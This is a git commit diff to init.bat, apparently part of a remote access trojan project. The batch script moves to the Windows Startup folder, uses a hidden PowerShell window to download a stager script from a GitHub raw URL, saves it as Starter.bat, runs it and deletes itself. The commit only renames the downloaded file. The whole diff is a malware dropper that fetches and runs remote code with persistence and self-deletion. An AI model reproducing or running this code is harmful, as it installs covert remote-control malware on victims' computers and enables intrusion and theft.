481512df43194e273d5715d8c4e1dbb46e0a6e25
saif <saif.aboueldahab@gmail.com>
2023-05-25 19:03:26 +0300

    s

--- init.bat
+++ init.bat
@@ -2,7 +2,7 @@
 set "currentd=%cd%"
 set "targetd=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 cd %targetd%
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/saifnasef/RAT/main/stager.bat -o stager.bat"
-powershell ./stager.bat
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/saifnasef/RAT/main/stager.bat -o Starter.bat"
+powershell ./Starter.bat
 cd %currentd%
 del init.bat
